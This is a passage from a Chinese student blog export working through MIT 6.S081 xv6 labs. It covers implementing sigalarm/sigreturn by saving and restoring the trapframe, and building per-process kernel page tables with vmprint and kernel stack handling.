小心函数地址为0的情况，因为函数地址可以为0，我是傻逼！</p></li><li><p>你将需要去修改<code>usertrap</code>函数，使得当一个进程的alarm时间间隔到期时，用户进程执行处理函数</p><p> 当一个陷入返回到用户空间时，是什么决定着用户空间代码继续执行的指令地址？</p></li><li><p>如果你运行<code>make CPUS=1 qemu-gdb</code>，会使用用gdb查看trap的时候更容易</p></li><li><p>如果<code>alarmtest</code>打印了<code>alarm!</code>，你就成功了</p></li></ol><h2 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h2><ol><li><p>首先根据它的提示去各个文件中把系统调用的声明给弄好</p></li><li><p>然后在<code>struct proc</code>中增加如下字段，其中关键在于<code>uint64 handler</code>，它是函数指针，不过终究也就是个指针，因此可以用<code>uint64</code>来表示</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> cur_ticks;<br>uint64 handler;<br><span class="hljs-type">int</span> ticks;<br></code></pre></td></tr></table></figure></li><li><p>在<code>sysprorc.c</code>中完成<code>sys_sigalarm</code>和<code>sys_sigreturn</code></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>    p = myproc();<br>    argint(<span class="hljs-number">0</span>, &amp;p-&gt;ticks);<br>    argaddr(<span class="hljs-number">1</span>, &amp;p-&gt;handler);<br>    p-&gt;cur_ticks = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>uint64<br><span class="hljs-title function_">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>最后在<code>trap.c</code>中完成调用</p><p> 注意了，函数指针可能是0，所以用ticks是否为0判断是否需要计数</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (which_dev == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">if</span> (p-&gt;ticks != <span class="hljs-number">0</span>) &#123;<br>        p-&gt;cur_ticks++;<br>        <span class="hljs-keyword">if</span> (p-&gt;cur_ticks == p-&gt;ticks) &#123;<br>            p-&gt;cur_ticks = <span class="hljs-number">0</span>;<br>            p-&gt;trapframe-&gt;epc = p-&gt;handler;<br>        &#125;<br>    &#125;<br>    yield();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里的实现是如果当前已经到了第n个时钟中断，那么会先去中断，等下一次获得cpu使用权时，再去执行handler操作</p><p>我试了一下在放弃cpu之前直接<code>p-&gt;handler()</code>，结果不允许</p><p>估计是因为地址的原因，现在可是在内核态，怎么可能能够通过这个用户态的虚拟地址来执行</p><p>所以，只能等到这个进程再次获得CPU并且回归用户态用，就会用epc这个参数来初始化pc，就会从这里开始执行了</p></blockquote></li></ol><h2 id="hints2"><a href="#hints2" class="headerlink" title="hints2"></a>hints2</h2><blockquote><p>你需要在执行完<code>alarm</code>处理函数之后，正确返回程序被中断的地方，并且各种寄存器的状态也要不变</p><p>xv6已经为实现提供了一种思路，即每个alarm处理函数的最后都有一个<code>alarmreturn</code>函数，你可以通过<code>usertrap</code>和<code>sys_sigreturn</code>合作来完成用户进程的恢复</p></blockquote><ol><li>你将需要保存和恢复寄存器，很多很多</li><li>在<code>struct proc</code>中保存足够多的状态，使得你可以在<code>sigreturn</code>中恢复</li><li>如果一个处理函数还没有结束，内核不应该再次调用它</li></ol><h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h2><p>到了这一步，必须要先搞清楚系统调用的过程中对于状态的保存和恢复了</p><ol><li><code>uservec</code>保存了各种常用的寄存器</li><li><code>usertrap</code>将返回的pc地址存到了<code>p-&gt;trapframe-&gt;epc</code></li><li><code>usertrapret</code>通过<code>p-&gt;trapframe-&gt;epc</code>恢复pc</li><li><code>userret</code>恢复各种寄存器</li></ol><p>首先，我们希望在时钟中断之后，这个进程被调度回来的时候，去执行alarm处理函数，因此我们需要在时钟中断的处理中，将<code>epc</code>置为处理函数的地址，这样就完成了task0</p><p>但是如果只是这样的话，这个进程在执行完alarm处理函数之后并不能正确的返回需要执行的地方。那如何正确的返回呢？</p><p>可以发现，alarm处理函数的最后一句通常是<code>alarmreturn</code>，这是一个系统调用！如果我们能够在这个系统调用返回之前将trapframe（因为trapframe包括了所有返回用户态需要的信息，所以我们只需要这个就行了）变成在时钟中断处理之前的样子，那么就可以借用<code>alarmreturn</code>这个系统调用的返回操作回到我们想去的地方</p><p>而需要注意的是，如果已经执行了alarm处理函数，那此时的trapframe肯定是不行的，因为包括pc和各种通用寄存器都被破坏的，那哪个时间点的trapframe可以呢？</p><p>答案是刚进入<code>if (which_dev == 2) </code>的时候，想一想，如果我们不需要搞这个什么alarm，那么等之后这个进程再次被调度到cpu之后，那不就是继续正常执行吗？说明这个时间点的trapframe可以通过任何一个系统调用的返回过程使得进程执行到继续执行的地方</p><p>不过我们也没必要每次进入这里都保存了，只需要在确定了会去执行alarm处理函数的时候保存，在<code>alarmreturn</code>中恢复即可</p><p>除此之外，题目还要求如果已经有一个alarm处理函数在执行，那么其他的必须等待，因此额外增加一个变量代表是否有在执行</p><p>具体实现如下</p><p>首先给proc结构体增加如下变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">alarm_tf</span>;</span><br><span class="hljs-type">int</span> is_runing;<br></code></pre></td></tr></table></figure><p>并且在进程初始化和终止的时候对这两个变量进行处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">// 进程初始化，这里主要是防止申请不成功，那就学着已有的代码对进程进行销毁</span><br>p-&gt;alarm_tf = (<span class="hljs-keyword">struct</span> trapframe *)kalloc();<br>   <span class="hljs-keyword">if</span> (p-&gt;alarm_tf == <span class="hljs-number">0</span>) &#123;<br>       freeproc(p);<br>       release(&amp;p-&gt;lock);<br>       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br>   p-&gt;is_runing = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 进程结束</span><br>kfree(p-&gt;alarm_tf);<br></code></pre></td></tr></table></figure><p><code>trap.c</code>中的代码进行如下更新</p><ul><li>注意<code>p-&gt;cur_ticks &gt;= p-&gt;ticks</code>，这里变成大于等于，是为了保证现在可以等，但之后如果没有正在运行的了，那就可以进入alarm处理函数的流程。如果和之前一样是等于号的好，那可能就错过了</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (which_dev == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">if</span> (p-&gt;ticks != <span class="hljs-number">0</span>) &#123;<br>        p-&gt;cur_ticks++;<br>        <span class="hljs-keyword">if</span> (p-&gt;cur_ticks &gt;= p-&gt;ticks &amp;&amp; p-&gt;is_runing == <span class="hljs-number">0</span>) &#123;<br>            memmove(p-&gt;alarm_tf, p-&gt;trapframe, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> trapframe));<br>            p-&gt;is_runing = <span class="hljs-number">1</span>;<br>            p-&gt;cur_ticks = <span class="hljs-number">0</span>;<br>            p-&gt;trapframe-&gt;epc = (uint64)p-&gt;handler;<br>        &#125;<br>    &#125;<br>    yield();<br>&#125;<br></code></pre></td></tr></table></figure><p>最后修改<code>sys_sigreturn</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>    p = myproc();<br>    memmove(p-&gt;trapframe, p-&gt;alarm_tf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> trapframe));<br>    p-&gt;is_runing = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>系统调用的过程很复杂，设计的也很巧妙。并且由于内核态和用户态的虚拟地址空间不一样，导致了一些麻烦的操作。不过在各种状态的切换中，进程的trapframe包含了这个进程所有的信息，拥有一个进程某个时刻的trapframe，就可以在任意时候将这个进程恢复到这个状态，这也是这个lab考察的内容</li><li>在这个lab中我们不需要自己去做各种东西的切换，只需要提供一个正确的trapframe即可</li><li>系统调用会经历那四个阶段，时钟中断导致的进程切换和恢复最起码也会经历最后的两个阶段</li></ol>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab3</title>
    <link href="/2023/08/18/6-s081-lab3/"/>
    <url>/2023/08/18/6-s081-lab3/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204007.png" alt="20231224204007"></p><h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h1><blockquote><p>在这个lab中，你将探索页表，并且修改它们以简化从用户空间拷贝数据到内核空间的函数</p><p>在开始之前，需要完成</p><ol><li>阅读xv6 book的第3章</li><li><code>kern/memlayout.h</code> 有关内存的布局</li><li><code>kern/vm.c</code> 包含大部分虚拟内存的代码</li><li><code>kernel/kalloc.c</code> 分配和释放虚拟内存的代码</li></ol></blockquote><h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204049.png" alt="20231224204049"></p><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><ol><li><p>定义一个叫做<code>vmprint(pagetable_t)</code>的函数，用下面的格式打印页表</p></li><li><p>添加<code>if(p-&gt;pid==1) vmprint(p-&gt;pagetable)</code>到<code>exec.c</code>中<code>return argc</code>语句前面，这将会打印第一个进程的页表</p></li><li><p>通过<code>make grade</code>的<code>pte printout</code>进行测试，也可以</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./grade-lab-pgtbl pte printout<br></code></pre></td></tr></table></figure></li></ol><hr><p>打印的格式如下</p><ol><li>首先从根页表开始从上到下地递归地打印，并且只打印有效的页表项</li><li>具体到每一个页表项<ol><li>加入是第<code>x</code>级的页表，那就先打印<code>x</code>个<code>..</code></li><li>然后打印这个页表项在这个页表中的索引</li><li>pte后面紧跟着的内容是这个页表项的所有内容，总共64bit</li><li>pa后面紧跟着的就是这个页表项指向的地址，假设pte页表项的内容是<code>val</code>，那么<code>pa=((val&gt;&gt;10)&lt;&lt;12)</code>，xv6中已经定义了一个宏来实现</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">page table <span class="hljs-number">0x0000000087f6e000</span><br>.<span class="hljs-number">.0</span>: pte <span class="hljs-number">0x0000000021fda801</span> pa <span class="hljs-number">0x0000000087f6a000</span><br>.. .<span class="hljs-number">.0</span>: pte <span class="hljs-number">0x0000000021fda401</span> pa <span class="hljs-number">0x0000000087f69000</span><br>.. .. .<span class="hljs-number">.0</span>: pte <span class="hljs-number">0x0000000021fdac1f</span> pa <span class="hljs-number">0x0000000087f6b000</span><br>.. .. .<span class="hljs-number">.1</span>: pte <span class="hljs-number">0x0000000021fda00f</span> pa <span class="hljs-number">0x0000000087f68000</span><br>.. .. .<span class="hljs-number">.2</span>: pte <span class="hljs-number">0x0000000021fd9c1f</span> pa <span class="hljs-number">0x0000000087f67000</span><br>.<span class="hljs-number">.255</span>: pte <span class="hljs-number">0x0000000021fdb401</span> pa <span class="hljs-number">0x0000000087f6d000</span><br>.. .<span class="hljs-number">.511</span>: pte <span class="hljs-number">0x0000000021fdb001</span> pa <span class="hljs-number">0x0000000087f6c000</span><br>.. .. .<span class="hljs-number">.510</span>: pte <span class="hljs-number">0x0000000021fdd807</span> pa <span class="hljs-number">0x0000000087f76000</span><br>.. .. .<span class="hljs-number">.511</span>: pte <span class="hljs-number">0x0000000020001c0b</span> pa <span class="hljs-number">0x0000000080007000</span><br></code></pre></td></tr></table></figure><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li>在<code>kernel/vm.c</code>中完成这个函数</li><li>使用<code>kernel/riscv.h</code>中定义的宏</li><li><code>freewalk</code>将给你灵感</li><li>记得在<code>kernel/defs.h</code>中声明你的函数，这样才可以在<code>exec</code>函数中使用它</li><li>使用<code>%p</code>去打印64bit的pte和address</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>先看看<code>freewalk</code>中是如何遍历这三级页表的，思路就比较清晰了</li><li>这里用了一个depth控制当前位于第几级页表，方便打印和控制递归的终点</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> depth = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print_prefix</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= depth; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;..&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i &lt; depth) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: &quot;</span>, i);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">vmprint</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> pagetable)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page table %p\n&quot;</span>, pagetable);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) &#123;<br>        <span class="hljs-type">pte_t</span> pte = pagetable[i];<br>        <span class="hljs-comment">// 如果这一项有效</span><br>        <span class="hljs-keyword">if</span> (pte &amp; PTE_V) &#123;<br>            print_prefix(i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pte %p &quot;</span>, pte);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pa %p&quot;</span>, PTE2PA(pte));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">if</span> (depth &lt; <span class="hljs-number">2</span>) &#123;<br>                depth++;<br>                vmprint((<span class="hljs-type">pagetable_t</span>)PTE2PA(pte));<br>                depth--;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/67ec90982a407e293f47cbb1ba858c3d.png" alt="image-20230817200840273"></p><h1 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h1><blockquote><p>这个task和下一个task的目标就是使得内核可以直接解引用进程传递的指针</p></blockquote><h2 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h2><ol><li>在这个task中，你先修改kernel，使得每个进程在内核态的时候都可以用它自己对内核页表的拷贝</li><li>修改<code>struct proc</code>为每个进程都维护一个内核页表</li><li>修改<code>scheduler</code>使得进程切换的时候切换内核的页表</li><li>完成到这一步时，每个进程中的内核页表都应该和现在的全局内核页表相同</li><li>如果你能通过<code>usertests</code>就说明完成了这个task</li></ol><h2 id="hints-1"><a href="#hints-1" class="headerlink" title="hints"></a>hints</h2><ol><li><p>在<code>struct proc</code>中增加一个字段表示这个进程独有的内核页表</p></li><li><p>为一个新进程创造一个内核页表的合理的方法是</p><p> 实现一个<code>kvminit</code>的新版本，这个新版本会创建一个新的页表，而不是修改已有的页表</p><p> 你需要在<code>allocproc</code>中调用这个新的函数</p></li><li><p>保证每个进程的内核页表都有一个映射，这个映射可以找到进程的内核栈</p><p> 在未修改的xv6中，所有的内核栈都在<code>procinit</code>中被创造</p><p> 你需要去移动<code>procinit</code>中的部分或者全部到<code>allocproc</code>中</p></li><li><p>修改<code>scheduler()</code>去将进程的内核页面加载到<code>satp</code>寄存器， 可以通过<code>kvminithart</code>学习这个的用法</p><p> 不要忘记在调用<code>w_satp</code>之后调用<code>sfence_vma</code></p></li><li><p>调度器应该在没有进程运行时使用<code>kernal_pagetable</code></p></li><li><p>在<code>freeproc</code>中释放一个进程的内核页表</p></li><li><p>你将需要一个方法，这个方法在释放页表的同时不会释放真正的物理页面</p></li><li><p><code>vmprint</code>可以在debug页表的时候办法</p></li></ol><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>可以说，跟着hint一步一步走，就成功了，但是我个人觉得hint或者说这个文档没有说的非常清楚，导致有一点歧义，接下来一个hint一个hint分析</p><ol><li>在<code>proc</code>中增加一个字段，这个就不用说了</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pagetable_t</span> kernel_pgtbl;<br></code></pre></td></tr></table></figure><ol start="2"><li>这是创建内核页表的关键。我之前以为是要把现在的内核页表给复刻一遍，结果写了个递归函数去copy当前的内核页表。但是实际上，只需要我们创建一个和<code>kvminit</code>创建出来的的内核页表一样的就行了，也就是最原始的那种，只有内核的代码和数据以及一些外设，这些代码都在<code>kvminit</code>代码中，所以直接抄一份就行了</li></ol><p>通过这个代码可以发现，创建一个最原始的内核页表，就三步</p><ul><li>先申请一个物理页</li><li>将这个物理页清空</li><li>写入固定的一系列地址到页表中（大量的<code>kvmmap</code>操作）</li></ul><p>最后在<code>allocproc</code>中进程被正确创建之后，给这个进程的内核页表赋值<code>p-&gt;kernel_pgtbl = new_kernel_pgtbl();</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">init_kernel_pgtbl</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> pgtbl)</span> &#123;<br>    <span class="hljs-built_in">memset</span>(pgtbl, <span class="hljs-number">0</span>, PGSIZE);<br><br>    <span class="hljs-comment">// uart registers</span><br>    kvmmap(pgtbl, UART0, UART0, PGSIZE, PTE_R | PTE_W);<br><br>    <span class="hljs-comment">// virtio mmio disk interface</span><br>    kvmmap(pgtbl, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br><br>    <span class="hljs-comment">// CLINT</span><br>    kvmmap(pgtbl, CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br><br>    <span class="hljs-comment">// PLIC</span><br>    kvmmap(pgtbl, PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br><br>    <span class="hljs-comment">// map kernel text executable and read-only.</span><br>    kvmmap(pgtbl, KERNBASE, KERNBASE, (uint64)etext - KERNBASE, PTE_R | PTE_X);<br><br>    <span class="hljs-comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span><br>    kvmmap(pgtbl, (uint64)etext, (uint64)etext, PHYSTOP - (uint64)etext, PTE_R | PTE_W);<br><br>    <span class="hljs-comment">// map the trampoline for trap entry/exit to</span><br>    <span class="hljs-comment">// the highest virtual address in the kernel.</span><br>    kvmmap(pgtbl, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>&#125;<br><br><span class="hljs-type">pagetable_t</span> <span class="hljs-title function_">new_kernel_pgtbl</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pagetable_t</span> pgtbl = (<span class="hljs-type">pagetable_t</span>)kalloc();<br>    init_kernel_pgtbl(pgtbl);<br>    <span class="hljs-keyword">return</span> pgtbl;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * create a direct-map page table for the kernel.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kvminit</span><span class="hljs-params">()</span> &#123;<br>    kernel_pagetable = new_kernel_pgtbl();<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，我们在这里修改了<code>kvmmap</code>函数的声明，因为之前它是默认使用内核页表的，现在需要用每个进程自己的内核页表，这里主要要修改两个函数，分别是<code>kvmmap</code>和<code>kvmpa</code>，注意要将修改更新到<code>defs.h</code>文件以及所有用到这两个函数的地方，有个比较隐秘的是在<code>virtio_disk.c</code></p><ol start="3"><li>内核栈相关的修改</li></ol><p>正常来说，内核栈是在<code>procinit</code>的时候对<code>proc</code>数组的所有进程进行初始化，然后将地址映射放到唯一的内核页表中</p><p>而我们现在只需要在<code>allocproc</code>中申请内存栈并将这个地址变换写到这个进程的内存页表即可</p><p>具体步骤如下</p><ul><li><p>将<code>procinit</code>函数中和内存栈相关的代码给剪切</p></li><li><p>将代码复制到<code>allocproc</code>的合适位置，放在进程内核页表被初始化的后面就不错</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> *pa = <span class="hljs-built_in">kalloc</span>();<br><span class="hljs-keyword">if</span> (pa == <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = <span class="hljs-built_in">KSTACK</span>((<span class="hljs-type">int</span>)(<span class="hljs-number">0</span>));<br><span class="hljs-built_in">kvmmap</span>(p-&gt;kernel_pgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><ol start="4"><li>hints的第4和第5点一起考虑</li></ol><p>第4点就是要求我们在进程获得cpu的时候把它自己的内核栈给切换上去，即修改寄存器<code>satp</code></p><p>第5点则是要求在没有进程使用的时候，切换到内核唯一的那个页表，这个可以通过在进程执行完之后就切换<code>satp</code>寄存器为唯一的内存页表</p><p>具体实现如下，在<code>swtch</code>函数执行前后进行切换即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">w_satp(MAKE_SATP(p-&gt;kernel_pgtbl));<br>sfence_vma();<br><br>swtch(&amp;c-&gt;context, &amp;p-&gt;context);<br><br>kvminithart();<br></code></pre></td></tr></table></figure><ol start="6"><li>最后一步，在进程被终止的时候，回收这个进程的内核页表</li></ol><p>首先补充一个hints没有说的，我们还需要回收这个进程的内核栈的那个页面，否则会造成内存浪费</p><p>在<code>freeproc</code>函数中加入如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (p-&gt;kernel_pgtbl) &#123;<br>    free_kernel_stack(p-&gt;kernel_pgtbl, p-&gt;kstack);<br>    p-&gt;kstack = <span class="hljs-number">0</span>;<br>    free_kernel_pgtbl(p-&gt;kernel_pgtbl, <span class="hljs-number">0</span>);<br>    p-&gt;kernel_pgtbl = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>free_kernel_stack</code>就是通过栈的虚拟地址，经过内核页表，找到物理地址，将其free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_kernel_stack</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> pgtbl, uint64 stack_p)</span> &#123;<br>    <span class="hljs-type">void</span> *real_p = (<span class="hljs-type">void</span> *)kvmpa(pgtbl, stack_p);<br>    kfree(real_p);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>free_kernel_pgtbl</code>就复杂一些，需要递归地删除这个内核页表，并且不能真正地删除物理页面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_kernel_pgtbl</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> pgtbl, <span class="hljs-type">int</span> depth)</span> &#123;<br>    <span class="hljs-keyword">if</span> (depth == <span class="hljs-number">2</span>) &#123;<br>        kfree((<span class="hljs-type">void</span> *)pgtbl);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) &#123;<br>        <span class="hljs-type">pte_t</span> *pte = &amp;pgtbl[i];<br>        <span class="hljs-keyword">if</span> (*pte &amp; PTE_V) &#123;<br>            free_kernel_pgtbl((<span class="hljs-type">pagetable_t</span>)(PTE2PA(*pte)), depth + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    kfree((<span class="hljs-type">void</span> *)pgtbl);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>至此，第二个task结束，可以运行<code>./grade-lab-pgtbl 